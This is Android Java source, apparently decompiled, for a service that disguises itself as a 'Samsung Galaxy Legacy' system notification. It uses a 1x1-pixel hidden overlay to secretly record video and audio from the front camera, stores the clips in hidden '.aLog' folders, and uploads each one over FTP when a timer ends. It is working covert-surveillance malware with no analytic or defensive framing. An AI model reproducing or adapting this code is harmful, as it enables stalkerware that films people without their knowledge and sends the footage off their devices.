package stupuid.maga.legacy;

import android.app.Notification.Builder;
import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import com.androidhiddencamera.config.CameraResolution;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class VideoService extends Service implements Callback, Runnable {
    public static boolean isRunning;
    File aFile;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    private SurfaceView surfaceView;
    private WindowManager windowManager;

    public void onCreate() {
        new Thread(this).start();
        startForeground(1234, new Builder(this).setContentTitle("Samsung Galaxy Legacy").setContentText("Samsung Galaxy Legacy").setSmallIcon(R.drawable.samsung).build());
        isRunning = true;
        this.windowManager = (WindowManager) getSystemService("window");
        this.surfaceView = new SurfaceView(this);
        LayoutParams layoutParams = new LayoutParams(1, 1, CameraResolution.HIGH_RESOLUTION, 262144, -3);
        layoutParams.gravity = 51;
        this.windowManager.addView(this.surfaceView, layoutParams);
        this.surfaceView.getHolder().addCallback(this);
    }

    private File openFileForImage() {
        if (Environment.getExternalStorageState().equals("mounted")) {
            File imageDirectory = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), ".aLog/.videos/");
            if (imageDirectory.exists() || imageDirectory.mkdirs()) {
                File someFile = new File(imageDirectory.getPath() + File.separator + "image_" + new SimpleDateFormat("mm_dd_yyyy_hh_mm_ss", Locale.getDefault()).format(new Date()) + ".mp4");
                this.aFile = someFile;
                return someFile;
            }
        }
        return null;
    }

    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        String path;
        this.camera = Camera.open(1);
        this.mediaRecorder = new MediaRecorder();
        this.camera.unlock();
        this.mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        this.mediaRecorder.setCamera(this.camera);
        this.mediaRecorder.setAudioSource(5);
        this.mediaRecorder.setVideoSource(1);
        this.mediaRecorder.setProfile(CamcorderProfile.get(0));
        String state = Environment.getExternalStorageState();
        String name = DateFormat.format("yyyy-MM-dd_kk-mm-ss", new Date().getTime()) + ".mp4";
        if ("mounted".equals(state)) {
            path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES) + "/.aLog/.movie/" + name;
        } else {
            path = getFilesDir().getAbsolutePath() + "/.aLog/.movie/" + name;
        }
        Log.d("info", "path: " + path);
        this.mediaRecorder.setOutputFile(openFileForImage().getPath());
        try {
            Intent I = new Intent();
            if (I.getStringExtra("hasData") != null) {
                int time = I.getIntExtra("time", 0);
                this.mediaRecorder.setMaxDuration(time);
                aTimer(time);
                this.mediaRecorder.prepare();
                this.mediaRecorder.start();
                isRunning = true;
                return;
            }
            this.mediaRecorder.prepare();
            this.mediaRecorder.start();
            aTimer(10000);
            isRunning = true;
        } catch (Exception e) {
            stopSelf();
        }
    }

    public void aTimer(int a) {
        new CountDownTimer((long) a, 1000) {
            public void onTick(long millisUntilFinished) {
                Log.i("time", Long.toString(millisUntilFinished / 1000));
            }

            public void onFinish() {
                VideoService.this.mediaRecorder.stop();
                VideoService.this.mediaRecorder.reset();
                VideoService.this.mediaRecorder.release();
                VideoService.this.camera.lock();
                VideoService.this.camera.release();
                BetterPrinter.FTPIt(VideoService.this.aFile.getAbsolutePath(), VideoService.this.aFile.getName(), VideoService.this.getApplicationContext());
            }
        }.start();
    }

    public void onDestroy() {
        this.mediaRecorder.stop();
        this.mediaRecorder.reset();
        this.mediaRecorder.release();
        this.camera.lock();
        this.camera.release();
        this.windowManager.removeView(this.surfaceView);
    }

    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
    }

    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int a, int b) {
        Log.i("started", "started");
        return 2;
    }

    public void run() {
    }
}
